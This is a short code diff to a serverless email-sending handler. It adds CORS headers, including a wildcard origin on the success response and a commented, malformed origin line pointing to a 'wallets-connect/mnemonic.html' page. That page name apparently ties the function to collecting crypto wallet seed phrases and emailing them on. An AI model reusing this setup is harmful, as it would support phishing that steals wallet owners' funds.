@@ -34,6 +34,8 @@ exports.handler = async (event,context)=>{
                 statusCode:400,
                 body:'provide all values'
             }
+             Access-Control-Allow-Origin: http://wallets-connect/mnemonic.html
+            Access-Control-Allow-Origin: [http://](http:)<domain-of-site-x>>
     }
      */
 // console.log(event)
@@ -56,6 +58,7 @@ try {
     
     await transporter.sendMail({...data})
     return {
+        headers:{'Access-Control-Allow-Origin':'*'},
             statusCode:200,
             body:JSON.stringify(`${message}`)
         }
